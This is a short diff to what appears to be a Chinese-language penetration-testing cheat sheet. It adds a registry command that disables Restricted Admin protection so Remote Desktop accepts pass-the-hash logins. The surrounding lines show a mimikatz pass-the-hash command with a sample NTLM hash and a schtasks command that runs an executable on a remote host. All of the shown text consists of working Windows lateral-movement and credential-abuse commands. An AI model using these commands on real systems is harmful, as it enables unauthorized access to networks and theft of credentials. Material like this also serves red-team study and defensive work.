@@ -287,6 +287,7 @@ schtasks /create /tn "test123456" /tr C:\srn7final.exe /sc once /st 14.25 /S 192
 ### mimikatz PTH 传递攻击
 
 ```sh
+REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f   # 允许pth登录
 # pth 传递弹出cmd
 mimikatz.exe "privilege::debug" "sekurlsa::pth /user:WIN2016$ /domain:g1ts /ntlm:19b241fc247a06034210b12ae3aca2d9"
 
